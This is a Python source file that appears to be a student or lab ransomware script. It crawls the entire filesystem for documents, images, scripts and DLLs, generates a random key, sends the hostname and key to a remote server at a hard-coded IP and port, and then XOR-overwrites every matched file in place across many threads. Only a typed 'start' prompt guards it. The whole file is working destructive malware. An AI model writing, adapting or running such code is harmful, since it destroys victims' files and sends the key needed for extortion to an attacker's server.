import os, platform, random, socket, sys
from datetime import datetime 
import threading
# from queue import Queue

### COLLECT FUNCTION ###
def collect(extension_tuple):
    # grab all files from the machine
    file_list = []

    with threading.Lock():
        # check os
        if platform.system() == "Windows":
            root_directory, separator  = "C:\\", "\\"
        else:
            root_directory, separator = "/", "/"

        # go through every path in the system and if a file extension matches some from the tuple then add it to the list of files to encrypt
        for root, dirs, files in os.walk(root_directory):
            for file in files:
                file_path, file_ext = os.path.splitext(root+separator+file)
                if file_ext in extension_tuple:
                    file_list.append(root+separator+file)

    return file_list

### KEY FUNCTION ####
def keygen():
# generate key
    key = ""
    encryption_level = 128 // 8
    charpool = ""
    for i in range(0x00, 0xFF):
        charpool += (chr(i))
    for i in range(encryption_level):
        key += random.choice(charpool)
    return key, encryption_level


### CONENCTION FUNCTION ###
def connection(ip, port, generated_key): # takes a string IP, int port and string key arguments
# server connection. send hostname and key
    hostname = os.getenv("COMPUTERNAME")
    server_ip = ip #"10.0.2.15"
    server_port = port #6969
    key = generated_key
    time = datetime.now()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)       # create socket object
    s.connect((server_ip, server_port))                         # connect to server
    s.send((f'[{time}] - {hostname} Key:{key}').encode("UTF-8"))    # send info
    s.close()                                                   # and dip out


### ENCRYPT FUNCTION ###
def encrypt(file, key, encryption_level):
    # TODO: encryption logic here
    index = 0
    max_index = encryption_level - 1
    try:
        with open(file, "rb") as f:
            data = f.read()
        with open(file, "wb") as f:
            for byte in data:
                xor_byte = byte ^ ord(key[index])
                f.write(xor_byte.to_bytes(1, sys.byteorder))
                if index >= max_index:
                    index = 0
                else:
                    index += 1
    except FileNotFoundError:
        print("File not Found")
    except PermissionError:
        print("No permission to access this")
    except IsADirectoryError:
        print("This is a directory")
    #except OsError as e:
        #print("Error: ", e)
    except:
        print("Something went wrong :c")
    

def main():

    # safeguard for testing purposes
    safeguard = input("Are you sure you want to run this? If yes enter start: ")
    if safeguard != "start":
        quit()

    # collect all files from the system into a list
    NUM_THREADS = 100 
    threads = []
    extensions = (".txt", ".py", ".pdf", ".odt", ".doc", ".docx", ".dll", ".sh", ".png", ".jpg")
    """
    for i in range(NUM_THREADS):
        t = threading.Thread(target=collect, args=extensions)
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    # Get the results from all of the threads
    results = [t.result for t in threads]

    # Flatten the list of results into a single list of files
    file_list = [file for sublist in results for file in sublist]
    """

    file_list = collect(extensions)

    key, encryption_level = keygen() # generate key
    connection("10.0.2.21", 6969, key) # sends info to server


    # Empty the threads list 
    threads = []

    # Create a thread for each file and add it to the list of threads
    for f in file_list:
      thread = threading.Thread(target=encrypt, args=(f, key, encryption_level))
      threads.append(thread)

    # Start the first NUM_THREADS threads
    for i in range(NUM_THREADS):
      threads[i].start()

    # Wait for the first NUM_THREADS threads to finish
    for i in range(NUM_THREADS):
      threads[i].join()

    # Start the remaining threads
    for i in range(NUM_THREADS, len(threads)):
      threads[i].start()

    # Wait for all threads to finish
    for thread in threads:
      thread.join()

if __name__ == "__main__":
    main() 
    
